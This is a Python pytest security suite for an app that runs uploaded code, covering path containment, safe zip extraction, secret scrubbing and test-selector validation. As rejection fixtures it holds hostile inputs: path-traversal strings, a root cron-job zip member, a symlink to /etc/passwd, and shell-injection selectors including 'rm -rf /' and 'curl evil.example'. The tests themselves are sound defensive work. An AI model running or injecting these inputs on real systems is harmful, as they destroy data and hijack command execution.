"""Security tests.

These cover the boundaries that protect the host from uploaded code: archive
extraction, path containment, and the guarantee that no secret ever reaches a
child process.
"""

from __future__ import annotations

import io
import zipfile
from pathlib import Path

import pytest

from app.security.archive_security import (
    ArchiveSecurityError,
    ExtractionLimits,
    safe_extract_zip,
)
from app.security.execution_security import (
    ExecutionSecurityError,
    assert_no_secrets,
    is_secret_key,
    scrub_env,
    validate_test_selector,
)
from app.security.path_security import (
    PathSecurityError,
    assert_editable,
    normalize_relative,
    safe_join,
)


# --------------------------------------------------------------- paths -----
@pytest.mark.parametrize(
    "candidate",
    [
        "../etc/passwd",
        "../../secret.txt",
        "a/../../b.py",
        "/etc/passwd",
        "C:/Windows/System32/cmd.exe",
        "C:\\Windows\\win.ini",
        "//server/share/file.py",
        "\\\\server\\share\\file.py",
        "",
        "   ",
    ],
)
def test_normalize_relative_rejects_unsafe_paths(candidate):
    with pytest.raises(PathSecurityError):
        normalize_relative(candidate)


@pytest.mark.parametrize(
    "candidate,expected",
    [
        ("main.py", "main.py"),
        ("./main.py", "main.py"),
        ("app/routes/users.py", "app/routes/users.py"),
        ("app\\routes\\users.py", "app/routes/users.py"),
        ("a/./b/c.py", "a/b/c.py"),
    ],
)
def test_normalize_relative_accepts_safe_paths(candidate, expected):
    assert normalize_relative(candidate) == expected


def test_safe_join_stays_inside_root(workspace: Path):
    target = safe_join(workspace, "pkg/module.py")
    assert str(target).startswith(str(workspace))


def test_safe_join_rejects_escape(workspace: Path):
    with pytest.raises(PathSecurityError):
        safe_join(workspace, "../outside.py")


def test_assert_editable_refuses_protected_files(workspace: Path):
    (workspace / ".env").write_text("OPENAI_API_KEY=sk-should-never-be-touched", encoding="utf-8")
    with pytest.raises(PathSecurityError):
        assert_editable(workspace, ".env")


def test_assert_editable_refuses_git_directory(workspace: Path):
    git_dir = workspace / ".git"
    git_dir.mkdir()
    (git_dir / "config").write_text("[core]", encoding="utf-8")
    with pytest.raises(PathSecurityError):
        assert_editable(workspace, ".git/config")


def test_assert_editable_refuses_binaries(workspace: Path):
    (workspace / "payload.exe").write_bytes(b"MZ\x00\x00")
    with pytest.raises(PathSecurityError):
        assert_editable(workspace, "payload.exe")


# ------------------------------------------------------------ archives -----
def _zip_bytes(entries: dict[str, bytes]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, payload in entries.items():
            zf.writestr(name, payload)
    return buffer.getvalue()


def test_safe_extract_accepts_normal_archive(tmp_path: Path):
    archive = tmp_path / "ok.zip"
    archive.write_bytes(_zip_bytes({"main.py": b"print('hi')\n", "tests/test_a.py": b"def test_a():\n    pass\n"}))
    destination = tmp_path / "out"
    report = safe_extract_zip(archive, destination)
    assert report.files_written == 2
    assert (destination / "main.py").exists()
    assert (destination / "tests" / "test_a.py").exists()


def test_safe_extract_rejects_path_traversal(tmp_path: Path):
    archive = tmp_path / "evil.zip"
    archive.write_bytes(_zip_bytes({"../../escaped.py": b"pwned"}))
    with pytest.raises(ArchiveSecurityError, match="traversal|unsafe"):
        safe_extract_zip(archive, tmp_path / "out")
    assert not (tmp_path.parent / "escaped.py").exists()


def test_safe_extract_rejects_absolute_member(tmp_path: Path):
    archive = tmp_path / "abs.zip"
    archive.write_bytes(_zip_bytes({"/etc/cron.d/pwn": b"* * * * * root sh"}))
    with pytest.raises(ArchiveSecurityError):
        safe_extract_zip(archive, tmp_path / "out")


def test_safe_extract_rejects_symlink(tmp_path: Path):
    archive = tmp_path / "link.zip"
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as zf:
        info = zipfile.ZipInfo("link-to-passwd")
        # 0xA1FF = S_IFLNK | 0777 in the high 16 bits of external_attr.
        info.external_attr = 0xA1FF << 16
        zf.writestr(info, "/etc/passwd")
    archive.write_bytes(buffer.getvalue())
    with pytest.raises(ArchiveSecurityError, match="symlink"):
        safe_extract_zip(archive, tmp_path / "out")


def test_safe_extract_rejects_zip_bomb(tmp_path: Path):
    archive = tmp_path / "bomb.zip"
    archive.write_bytes(_zip_bytes({"bomb.txt": b"0" * (8 * 1024 * 1024)}))
    limits = ExtractionLimits(max_file_bytes=2 * 1024 * 1024)
    with pytest.raises(ArchiveSecurityError):
        safe_extract_zip(archive, tmp_path / "out", limits)


def test_safe_extract_rejects_too_many_files(tmp_path: Path):
    archive = tmp_path / "many.zip"
    archive.write_bytes(_zip_bytes({f"f{i}.py": b"x" for i in range(60)}))
    limits = ExtractionLimits(max_file_count=10)
    with pytest.raises(ArchiveSecurityError, match="entries"):
        safe_extract_zip(archive, tmp_path / "out", limits)


def test_safe_extract_rejects_total_budget(tmp_path: Path):
    archive = tmp_path / "big.zip"
    archive.write_bytes(_zip_bytes({f"f{i}.bin": bytes(200_000) for i in range(10)}))
    limits = ExtractionLimits(max_total_uncompressed_bytes=500_000, max_compression_ratio=1e9)
    with pytest.raises(ArchiveSecurityError):
        safe_extract_zip(archive, tmp_path / "out", limits)


# ----------------------------------------------------------- execution -----
def test_scrub_env_removes_openai_key(monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "sk-live-should-not-leak")
    monkeypatch.setenv("GITHUB_TOKEN", "ghp_should_not_leak")
    monkeypatch.setenv("MY_DB_PASSWORD", "hunter2")
    env = scrub_env()
    assert "OPENAI_API_KEY" not in env
    assert "GITHUB_TOKEN" not in env
    assert "MY_DB_PASSWORD" not in env
    assert "sk-live-should-not-leak" not in "".join(env.values())


def test_scrub_env_keeps_what_python_needs(monkeypatch):
    env = scrub_env()
    assert env["PYTHONUNBUFFERED"] == "1"
    assert env["API_DOCTOR_SANDBOX"] == "1"


@pytest.mark.parametrize(
    "key", ["OPENAI_API_KEY", "AWS_SECRET_ACCESS_KEY", "SOME_TOKEN", "APP_PASSWORD", "X_APIKEY"]
)
def test_is_secret_key(key):
    assert is_secret_key(key)


def test_assert_no_secrets_raises():
    with pytest.raises(ExecutionSecurityError):
        assert_no_secrets({"OPENAI_API_KEY": "sk-x"})


@pytest.mark.parametrize(
    "selector",
    ["tests/test_users.py::test_get_user", "tests/test_a.py", "tests/test_a.py::TestX::test_y"],
)
def test_validate_test_selector_accepts_node_ids(selector):
    assert validate_test_selector(selector) == selector


@pytest.mark.parametrize(
    "selector",
    [
        "--exitfirst",
        "-x",
        "../../etc/passwd",
        "tests/test_a.py; rm -rf /",
        "tests/test_a.py && curl evil.example",
        "$(whoami)",
        "`id`",
        "",
    ],
)
def test_validate_test_selector_rejects_dangerous_input(selector):
    with pytest.raises(ExecutionSecurityError):
        validate_test_selector(selector)
